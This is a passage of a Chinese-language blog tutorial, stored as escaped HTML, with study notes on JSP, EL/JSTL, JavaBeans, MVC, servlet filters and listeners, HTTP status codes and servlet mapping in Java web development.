jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%=变量或者表达式%&gt;</span><br><span class=\"line\">&lt;%=<span class=\"keyword\">new</span> java.util.Date()%&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以用${变量名}(EL表达式)代替,更高级,并且会将一些错误默认不显示,比如不存在的变量</p>\n<h5 id=\"脚本片段\"><a href=\"#脚本片段\" class=\"headerlink\" title=\"脚本片段\"></a>脚本片段</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">\tjava脚本片段</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"JSP声明\"><a href=\"#JSP声明\" class=\"headerlink\" title=\"JSP声明\"></a>JSP声明</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%!</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">int</span> globalVar = <span class=\"number\">0</span>;    </span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>会被编译到jsp生成的java类中,其他的会被生成到对应的java文件中的jspService方法中</p>\n<h5 id=\"在代码中嵌入HTML元素\"><a href=\"#在代码中嵌入HTML元素\" class=\"headerlink\" title=\"在代码中嵌入HTML元素\"></a>在代码中嵌入HTML元素</h5><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5</span>;i++)&#123;</span><br><span class=\"line\">    %&gt;</span><br><span class=\"line\">    &lt;h1&gt;hello,world &lt;%=i%&gt; &lt;/h1&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115211903441.png\" alt=\"image-20220115211903441\" style=\"zoom:80%;\" />\n\n<h3 id=\"JSP指令\"><a href=\"#JSP指令\" class=\"headerlink\" title=\"JSP指令\"></a>JSP指令</h3><h5 id=\"配置错误页面-lt-page-args…-gt\"><a href=\"#配置错误页面-lt-page-args…-gt\" class=\"headerlink\" title=\"配置错误页面&lt;%@page  args…%&gt;\"></a>配置错误页面&lt;%@page  args…%&gt;</h5><h5 id=\"方法1\"><a href=\"#方法1\" class=\"headerlink\" title=\"方法1\"></a>方法1</h5><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115215532167.png\" alt=\"image-20220115215532167\"></p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@page</span> errorPage=<span class=\"string\">&quot;error/500.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"方法2\"><a href=\"#方法2\" class=\"headerlink\" title=\"方法2\"></a>方法2</h5><p>修改web.xml</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220115215913478.png\" alt=\"image-20220115215913478\"></p>\n<h5 id=\"lt-include-file-””-gt\"><a href=\"#lt-include-file-””-gt\" class=\"headerlink\" title=\"&lt;%@include file=””%&gt;\"></a>&lt;%@include file=””%&gt;</h5><h4 id=\"九大内置对象\"><a href=\"#九大内置对象\" class=\"headerlink\" title=\"九大内置对象\"></a>九大内置对象</h4><ul>\n<li>pageContext     存东西    还可以forward()转发请求</li>\n<li>request    存东西</li>\n<li>Response</li>\n<li>Session    存东西</li>\n<li>Application      (ServletContext)存东西</li>\n<li>config            (ServletConfig)</li>\n<li>out</li>\n<li>page    几乎不用</li>\n<li>exception</li>\n</ul>\n<p>对象设置的值的作用域和时间比较</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">    pageContext.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字1&quot;</span>);<span class=\"comment\">//保存的数据只在一个页面中有效(它有个scope参数,可以修改作用域)</span></span><br><span class=\"line\">    request.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字2&quot;</span>);<span class=\"comment\">//保存的数据只在一次请求中有效,请求转发会携带这个数据</span></span><br><span class=\"line\">    session.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字3&quot;</span>);<span class=\"comment\">//保存的数据只在一次会话中有效,从打开浏览器到关闭浏览器</span></span><br><span class=\"line\">    application.setAttribute(<span class=\"string\">&quot;name1&quot;</span>,<span class=\"string\">&quot;名字4&quot;</span>);<span class=\"comment\">//保存的数据只在服务器中有效,从打开服务器到关闭服务器</span></span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>一些应用场景</p>\n<p>request:客户端向服务器发送请求,产生的数据,用户看完就没用了,比如,新闻</p>\n<p>session:客户端向服务器发送请求,产生的数据,用户看完还有用</p>\n<p>application:客户端向服务器发送请求,产生的数据,一个用户用完了,其他用户还可能用,比如:聊天数据</p>\n<h3 id=\"JSP标签-JSTL标签-EL表达式\"><a href=\"#JSP标签-JSTL标签-EL表达式\" class=\"headerlink\" title=\"JSP标签,JSTL标签,EL表达式\"></a>JSP标签,JSTL标签,EL表达式</h3><p>需要导入两个包</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.glassfish.web<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--standard标签库--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>taglibs<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>standard<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"EL表达式\"><a href=\"#EL表达式\" class=\"headerlink\" title=\"EL表达式\"></a>EL表达式</h4><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page  isELIgnored=<span class=\"string\">&quot;false&quot;</span>%&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>获取数据</li>\n<li>执行运算</li>\n<li>获取web开发的常用对象</li>\n</ul>\n<p>比如获取表单中的数据${param.参数名}</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116002754237.png\" alt=\"image-20220116002754237\"></p>\n<ul>\n<li><del>调用java方法</del></li>\n</ul>\n<h4 id=\"JSP标签\"><a href=\"#JSP标签\" class=\"headerlink\" title=\"JSP标签\"></a>JSP标签</h4><p>可以通过标签转发请求并携带参数</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%--&lt;jsp:include page=<span class=\"string\">&quot;page1.jsp&quot;</span>&gt;&lt;/jsp:include&gt;--%&gt;</span><br><span class=\"line\">&lt;jsp:forward page=<span class=\"string\">&quot;page1.jsp&quot;</span>&gt;</span><br><span class=\"line\">    &lt;jsp:param name=<span class=\"string\">&quot;user&quot;</span> value=<span class=\"string\">&quot;wuhu&quot;</span>/&gt;</span><br><span class=\"line\">    &lt;jsp:param name=<span class=\"string\">&quot;pwd&quot;</span> value=<span class=\"string\">&quot;***&quot;</span>/&gt;</span><br><span class=\"line\">&lt;/jsp:forward&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSTL表达式\"><a href=\"#JSTL表达式\" class=\"headerlink\" title=\"JSTL表达式\"></a>JSTL表达式</h4><p><label style=\"background:yellow\">JSTL标签库的使用就是为了弥补HTML标签的不足</label></p>\n<p>东西太多了,边用边查就行,使用前记得导包</p>\n<h5 id=\"核心标签-重点掌握一下\"><a href=\"#核心标签-重点掌握一下\" class=\"headerlink\" title=\"核心标签(重点掌握一下)\"></a>核心标签(重点掌握一下)</h5><p>要先在jsp页面中引入JSTL核心标签库</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@taglib</span> prefix=<span class=\"string\">&quot;c&quot;</span> uri=<span class=\"string\">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"JSTL标签库使用步骤\"><a href=\"#JSTL标签库使用步骤\" class=\"headerlink\" title=\"JSTL标签库使用步骤\"></a>JSTL标签库使用步骤</h5><ul>\n<li>引入对应的taglib</li>\n<li>使用其中的方法</li>\n<li>在Tomcat  lib中也需要引入JSTL的包,否则会报JSTL解析错误(其他包的解析错误也可用同样的方法手动导入到lib目录)</li>\n</ul>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">    ArrayList&lt;String&gt; students =<span class=\"keyword\">new</span> ArrayList&lt;&gt;();</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;张三&quot;</span>);</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;李四&quot;</span>);</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;王五&quot;</span>);</span><br><span class=\"line\">    students.add(<span class=\"string\">&quot;赵六&quot;</span>);</span><br><span class=\"line\">    request.setAttribute(<span class=\"string\">&quot;list&quot;</span>,students);</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;c:forEach <span class=\"keyword\">var</span>=<span class=\"string\">&quot;student&quot;</span> items=<span class=\"string\">&quot;$&#123;list&#125;&quot;</span>&gt;</span><br><span class=\"line\">    &lt;c:out value=<span class=\"string\">&quot;$&#123;student&#125;&quot;</span>/&gt;&lt;br&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116130300211.png\" alt=\"image-20220116130300211\"></p>\n<p>在使用jstl的过程中出现了诸多问题,对于notFoundclass这一类的问题的同意解决办法就是手动导入jstl1.2和standard1.1.2包到WEB-INF目录下的lib目录和tomcat的lib目录下,切记,不能2.0的包和1.2的包混着用</p>\n<p>对于使用maven阿里云镜像无法导入jstl1.2我表示真坑</p>\n<h4 id=\"javaBean\"><a href=\"#javaBean\" class=\"headerlink\" title=\"javaBean\"></a>javaBean</h4><p>实体类</p>\n<p>javaBean有特定的写法</p>\n<ul>\n<li>必须要有一个无参构造</li>\n<li>属性必须私有化</li>\n<li>必须有对应的get/set方法</li>\n</ul>\n<p>一般用来和数据库的字段做映射 ORM:</p>\n<h5 id=\"ORM-对象关系映射\"><a href=\"#ORM-对象关系映射\" class=\"headerlink\" title=\"ORM: 对象关系映射\"></a>ORM: 对象关系映射</h5><ul>\n<li>表—-&gt;类</li>\n<li>字段—–&gt;属性</li>\n<li>行记录—–&gt;对象</li>\n</ul>\n<h3 id=\"MVC三层架构\"><a href=\"#MVC三层架构\" class=\"headerlink\" title=\"MVC三层架构\"></a>MVC三层架构</h3><p>Model  View  Controller 模型,视图,控制器</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116213212850.png\" alt=\"image-20220116213212850\"></p>\n<p>Model</p>\n<ul>\n<li>业务处理:业务逻辑(service)</li>\n<li>数据持久层: CRUD (Dao)</li>\n</ul>\n<p>View</p>\n<ul>\n<li>展示数据</li>\n<li>提供链接发起Servlet请求</li>\n</ul>\n<p>Controller</p>\n<ul>\n<li>接收用户的请求(req:请求参数,Session信息…)</li>\n<li>交给业务层处理对应的代码</li>\n<li>控制视图的跳转</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录---&gt;接收用户的登录请求---&gt;处理用户的请求(获取用户登录的参数)---&gt;交给业务层处理登录业务(判断用户名密码是否正确)---&gt;Dao层查询用户名和密码是否正确</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h3><p>Filter过滤器,用来过滤网站的数据:</p>\n<p>web服务有一些垃圾请求,后台不应该处理,或者应该直接报错</p>\n<ul>\n<li>处理中文乱码</li>\n<li>登录验证……</li>\n</ul>\n<p>Filter开发步骤</p>\n<p>1.导包</p>\n<p>2.编写过滤器</p>\n<ul>\n<li>导包别错,是servlet下面的filter</li>\n<li>配置好web.xml,并且注意要过滤的路径</li>\n</ul>\n<p>例子</p>\n<p>web.xml中配置的内容,和servlet配置很像,<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code>表示要过滤的部分,和servlet的urlpattern相对应,属于包含关系了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-class</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-mapping</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--只要是经过/的请求,都会经过这个过滤器--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>CharacterEncodingFilter.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CharacterEncodingFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//初始化</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        servletRequest.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setContentType(<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest,servletResponse);<span class=\"comment\">//让请求继续走,不写程序就会在这里停止</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116223839656.png\" alt=\"image-20220116223839656\"></p>\n<p>没过滤之前乱码</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116223824121.png\" alt=\"image-20220116223824121\"></p>\n<p>过滤后</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220116223932653.png\" alt=\"image-20220116223932653\"></p>\n<h3 id=\"监听器\"><a href=\"#监听器\" class=\"headerlink\" title=\"监听器\"></a>监听器</h3><p>实现一个监听器的接口,有很多种,具体具体实现,和filter设置</p>\n<p>1.编写一个监听器</p>\n<ul>\n<li>实现监听器接口</li>\n</ul>\n<p>2.web.xml中配置监听器</p>\n<p>3.看情况是否使用</p>\n<h3 id=\"过滤器应用\"><a href=\"#过滤器应用\" class=\"headerlink\" title=\"过滤器应用\"></a>过滤器应用</h3><p>比如是否已经登录成功的校验,这样在访问网站需要登录才能访问的资源时,会经过一次loginFilter来校验,并决定是否允许其访问,这样在每次访问对应页面时候,就不用重复写校验是否已经登录的代码了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">loginFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//servletrequest拿不到session,做类型转换,转换成它爹httpservletrequest,response同理</span></span><br><span class=\"line\">        HttpServletRequest request=(HttpServletRequest) servletRequest;</span><br><span class=\"line\">        HttpServletResponse response=(HttpServletResponse) servletResponse;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(request.getSession().getAttribute(<span class=\"string\">&quot;USER_SESSION&quot;</span>)==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            response.sendRedirect(<span class=\"string\">&quot;/error.jsp&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            filterChain.doFilter(request,response);<span class=\"comment\">//已经登录则将请求传递下去给</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<p>http1.0:客户端与web服务器连接后,只能获得一个web资源,断开连接</p>\n<p>http2.0: 客户端与web服务器连接后,可以获得多个web资源</p>","more":"<h5 id=\"Http响应\"><a href=\"#Http响应\" class=\"headerlink\" title=\"Http响应\"></a>Http响应</h5><p>响应状态码</p>\n<p>200: 请求响应成功</p>\n<p>3**: 请求重定向</p>\n<p>4**: 找不到资源</p>\n<p>5**: 服务器代码错误500 502(网关错误)</p>\n<h5 id=\"MAVEN环境配置\"><a href=\"#MAVEN环境配置\" class=\"headerlink\" title=\"MAVEN环境配置\"></a>MAVEN环境配置</h5><p>M2_HOME   maven目录下的bin目录</p>\n<p>MAVEN_HOME  maven目录</p>\n<p>path中配置  %MAVEN_HOME%\\bin</p>\n<h4 id=\"Servlet\"><a href=\"#Servlet\" class=\"headerlink\" title=\"Servlet\"></a>Servlet</h4><h5 id=\"Servlet简介\"><a href=\"#Servlet简介\" class=\"headerlink\" title=\"Servlet简介\"></a>Servlet简介</h5><p>要在web.xml中导包</p>\n<ul>\n<li>Servlet就是sun公司开发动态web的一门技术</li>\n<li>Sun在这些API中提供一个接口叫做:Servlet,如果你想开发一个Servlet程序,只需要完成两个小步骤:<ul>\n<li>编写一个类,实现Servlet接口</li>\n<li>把开发好的java类部署到web服务器中</li>\n</ul>\n</li>\n</ul>\n<p>HelloServlet</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">helloServlet</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        PrintWriter writer=resp.getWriter();<span class=\"comment\">//响应流</span></span><br><span class=\"line\">        writer.println(<span class=\"string\">&quot;hello,Servlet&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doPost</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>目录结构</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113162720716.png\" alt=\"image-20220113162720716\"></p>\n<h5 id=\"编写Servlet映射\"><a href=\"#编写Servlet映射\" class=\"headerlink\" title=\"编写Servlet映射\"></a>编写Servlet映射</h5><p>写的是java程序,但是要通过浏览器访问,而浏览器需要连接web服务器,所以我们需要在web服务中注册我们写的servlet,还需要给它一个浏览器能够访问的路径</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113162502747.png\" alt=\"image-20220113162502747\"></p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113162617543.png\" alt=\"image-20220113162617543\"></p>\n<p>请求/hello后,会在web.xml中找/hello对应的servlet-name  hello,然后再向上找hello对应的servlet-class</p>\n<h5 id=\"servlet原理\"><a href=\"#servlet原理\" class=\"headerlink\" title=\"servlet原理\"></a>servlet原理</h5><p>本质上就是requset调用servlet中的service抽象类中我们自己实现的方法,再返回给servlet</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113163642745.png\" alt=\"image-20220113163642745\"></p>\n<h5 id=\"Mapping问题\"><a href=\"#Mapping问题\" class=\"headerlink\" title=\"Mapping问题\"></a>Mapping问题</h5><ul>\n<li><p>一个servlet可以指定一个或者多个路径,(本质上都是请求同一个class)</p>\n</li>\n<li><p>一个servlet可以指定通用(默认)映射路径</p>\n<ul>\n<li>```xml<servlet-mapping>\n    <servlet-name>hello</servlet-name>\n    <url-pattern>/hello/*</url-pattern>  <!--请求hello/下的都会请求到hello-->\n</servlet-mapping>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 默认请求路径(等于替代掉了index吧....)</span><br><span 